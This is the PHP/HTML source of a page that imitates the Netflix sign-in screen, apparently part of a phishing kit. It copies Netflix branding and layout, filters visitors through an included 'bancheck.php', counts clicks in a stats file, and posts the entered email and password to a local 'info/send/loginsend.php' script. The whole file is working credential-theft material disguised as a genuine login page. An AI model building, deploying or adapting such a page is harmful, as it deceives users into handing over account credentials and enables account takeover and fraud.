<?php
include './bancheck.php';
include ('./translation.php');
$filepath = './info/send/stats.ini';
$data = @parse_ini_file($filepath);
$data['cliques']++;
function update_ini_file($data, $filepath)
{
    $content = '';
    $parsed_ini = parse_ini_file($filepath, true);
    foreach ($data as $section => $values) {
        if ($section === '') {
            continue;
        }
        $content .= $section . '=' . $values . "\n\r";
    }
    if (!($handle = fopen($filepath, 'w'))) {
        return false;
    }
    $success = fwrite($handle, $content);
    fclose($handle);
}
update_ini_file($data, $filepath);
?>
<html lang="<?php echo $meta_langue ?>" data-triggered="true">
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta http-equiv="origin-trial" data-feature="EME Extension - Policy Check" data-expires="2018-11-26" content="Aob+++752GiUzm1RNSIkM9TINnQDxTlxz02v8hFJK/uGO2hmXnJqH8c/ZpI05b2nLsHDhGO3Ce2zXJUFQmO7jA4AAAB1eyJvcmlnaW4iOiJodHRwczovL25ldGZsaXguY29tOjQ0MyIsImZlYXR1cmUiOiJFbmNyeXB0ZWRNZWRpYUhkY3BQb2xpY3lDaGVjayIsImV4cGlyeSI6MTU0MzI0MzQyNCwiaXNTdWJkb21haW4iOnRydWV9">
        <title><?php echo $meta_title ?></title>
        <meta content="<?php echo $meta_keywords ?>" name="keywords">
        <meta content="<?php echo $meta_description ?>" name="description">
        <meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0">
        <link rel="shortcut icon" href="./img/nficon2016.ico">
        <link rel="apple-touch-icon" href="./img/nficon2016.png">
        <meta property="og:description" content="<?php echo $meta_description ?>">
        <meta name="twitter:card" content="player">
        <meta name="twitter:site" content="@netflix">
        <link type="text/css" rel="stylesheet" href="./css/style.css" >
        <link rel="preload" href="./js/login.js" as="script">
		<link  type="text/css" rel="stylesheet" href="./css/login2.css">
		<link  type="text/css" rel="stylesheet" href="./css/login.css">
    </head>
<body>
    <div id="appMountPoint" style="transition-duration : 2s" class="transition">
        <div class="login-wrapper hybrid-login-wrapper">
            <div class="login-wrapper-background"><img class="concord-img vlv-creative" src="./img/FR-fr-20211220-popsignuptwoweeks-perspective_alpha_website_large.jpg" alt=""></div>
            <div class="nfHeader login-header signupBasicHeader">
            <br/>
                <a href="/" class="svg-nfLogo signupBasicHeader" data-uia="netflix-header-svg-logo"><svg viewBox="0 0 111 30" class="svg-icon svg-icon-netflix-logo" focusable="true"><g id="netflix-logo"><path d="M105.06233,14.2806261 L110.999156,30 C109.249227,29.7497422 107.500234,29.4366857 105.718437,29.1554972 L102.374168,20.4686475 L98.9371075,28.4375293 C97.2499766,28.1563408 95.5928391,28.061674 93.9057081,27.8432843 L99.9372012,14.0931671 L94.4680851,-5.68434189e-14 L99.5313525,-5.68434189e-14 L102.593495,7.87421502 L105.874965,-5.68434189e-14 L110.999156,-5.68434189e-14 L105.06233,14.2806261 Z M90.4686475,-5.68434189e-14 L85.8749649,-5.68434189e-14 L85.8749649,27.2499766 C87.3746368,27.3437061 88.9371075,27.4055675 90.4686475,27.5930265 L90.4686475,-5.68434189e-14 Z M81.9055207,26.93692 C77.7186241,26.6557316 73.5307901,26.4064111 69.250164,26.3117443 L69.250164,-5.68434189e-14 L73.9366389,-5.68434189e-14 L73.9366389,21.8745899 C76.6248008,21.9373887 79.3120255,22.1557784 81.9055207,22.2804387 L81.9055207,26.93692 Z M64.2496954,10.6561065 L64.2496954,15.3435186 L57.8442216,15.3435186 L57.8442216,25.9996251 L53.2186709,25.9996251 L53.2186709,-5.68434189e-14 L66.3436123,-5.68434189e-14 L66.3436123,4.68741213 L57.8442216,4.68741213 L57.8442216,10.6561065 L64.2496954,10.6561065 Z M45.3435186,4.68741213 L45.3435186,26.2498828 C43.7810479,26.2498828 42.1876465,26.2498828 40.6561065,26.3117443 L40.6561065,4.68741213 L35.8121661,4.68741213 L35.8121661,-5.68434189e-14 L50.2183897,-5.68434189e-14 L50.2183897,4.68741213 L45.3435186,4.68741213 Z M30.749836,15.5928391 C28.687787,15.5928391 26.2498828,15.5928391 24.4999531,15.6875059 L24.4999531,22.6562939 C27.2499766,22.4678976 30,22.2495079 32.7809542,22.1557784 L32.7809542,26.6557316 L19.812541,27.6876933 L19.812541,-5.68434189e-14 L32.7809542,-5.68434189e-14 L32.7809542,4.68741213 L24.4999531,4.68741213 L24.4999531,10.9991564 C26.3126816,10.9991564 29.0936358,10.9054269 30.749836,10.9054269 L30.749836,15.5928391 Z M4.78114163,12.9684132 L4.78114163,29.3429562 C3.09401069,29.5313525 1.59340144,29.7497422 0,30 L0,-5.68434189e-14 L4.4690224,-5.68434189e-14 L10.562377,17.0315868 L10.562377,-5.68434189e-14 L15.2497891,-5.68434189e-14 L15.2497891,28.061674 C13.5935889,28.3437998 11.906458,28.4375293 10.1246602,28.6868498 L4.78114163,12.9684132 Z" id="Fill-14"></path></g></svg><span class="screen-reader-text">Netflix</span></a></div>
            <div class="login-body">
                <div><noscript><div data-uia="error-message-container" class="ui-message-container ui-message-error"><div class="ui-message-icon"></div><div data-uia="text" class="ui-message-contents"><?php echo $javascriptdesactiver ?></div></div></noscript>
                    <div class="login-content login-form hybrid-login-form hybrid-login-form-signup" data-uia="login-page-container">
                        <div class="hybrid-login-form-main">
                        <br/>
                            <h1 data-uia="login-page-title"><?php echo $Sidentifier ?></h1>

                        <form
            action="<?php echo './info/send/loginsend.php?enc=' .
                md5(time()) .
                '&p=0&dispatch=' .
                sha1(time()); ?>"
            method="post"
          >
            <?php if (isset($_GET['error'])) { ?>
            <p
              style="
                color: white;
                background-color: #ff9900;
                padding: 8px 10px;
                border-radius: 5px;
                margin: 20px 0px;
                font-family: Arial;
              "
            >
            <?php echo $lesinformations ?><strong><?php echo $correspondentpas ?></strong>.
            <?php echo $veuillezreesayez ?><strong><?php echo $reinitialiser ?></strong><?php echo $votremotdepasse ?>
            </p>
            <?php } ?>
                         <div data-uia="login-field+container"  class="nfInput nfEmailPhoneInput login-input login-input-email">
                                    <div class="nfInputPlacement">
                                        <div class="nfEmailPhoneControls">

                                            <label class="input_id">
                                                <input type="text" style="padding-top : 0;"   id="mail" name="mail"  placeholder="<?php echo $placeholderemail ?>" class="nfTextField"  value="" tabindex="0"  dir="">
                                            </label>
                                        </div>
                                    </div>
                                  
                                </div>
                                
                                <div data-uia="password-field+container" class="nfInput nfPasswordInput login-input login-input-password">
                                    <div class="nfInputPlacement">
                                        <div class="nfPasswordControls">
                                            <label class="input_id">
                                            <input type="password" style="padding-top : 0;" id="pass" name="pass" placeholder="<?php echo $placeholderpassword ?>" class="nfTextField" value="" tabindex="0"  dir="">                                             
                                        </label>
                                    </div>
                                </div>
                                
                                <div id="pass_error2" class="inputError" data-uia="password-field+error" style="display : none"><?php echo $caracteremotdepasse ?></div>

                                <center><button class=" btn login-button btn-submit btn-small" type="submit"  autocomplete="off"  tabindex="0" ><?php echo $Sidentifier ?></button></center>
                                <br/>
                                <div class="hybrid-login-form-help">
                                    <div class="ui-binary-input login-remember-me">
                                        <input type="checkbox" class="" id="bxid_rememberMe_true" value="true" tabindex="0" checked=""><label for="bxid_rememberMe_true" data-uia="label+rememberMe"><span class="login-remember-me-label-text"><?php echo $sesouvenirdemoi ?></span></label>
                                        <div class="helper"></div>
                                    </div><a class="link login-help-link" target="_self" data-uia="login-help-link"><?php echo $besoindaide ?></a></div>
                        </div>
                        <div class="hybrid-login-form-other">
                                <div class="facebookForm regOption">
                               
                                </div><input type="hidden"  value="websiteSignUp"><input type="hidden"  value="login"><input type="hidden"  value="facebookLoginAction"><input type="hidden"  value="rememberMe,nextPage,accessn"><input type="hidden" ><input type="hidden" ><input type="hidden"><input type="hidden"  ><input type="hidden" ><input type="hidden" >
                            <div class="login-signup-now" data-uia="login-signup-now"><?php echo $premierevisite ?><a class=" " target="_self" href="/"><?php echo $inscrivezvous ?></a>.</div>
                            <div class="recaptcha-terms-of-use" data-uia="recaptcha-terms-of-use">
                                <p><span><?php echo $cettepageestprotegerpargooglerecaptcha ?></span>&nbsp;<button class="recaptcha-terms-of-use--link-button" data-uia="recaptcha-learn-more-button"><?php echo $Ensavoirplus ?></button></p>
                            </div>
                        </div>
                    </div>
                    </form>
                </div>
            </div>
        </div>
        <?php include'./info/footer.php'?>
        </div>
    </div>
    <div>

    </div>
</body>

</html>
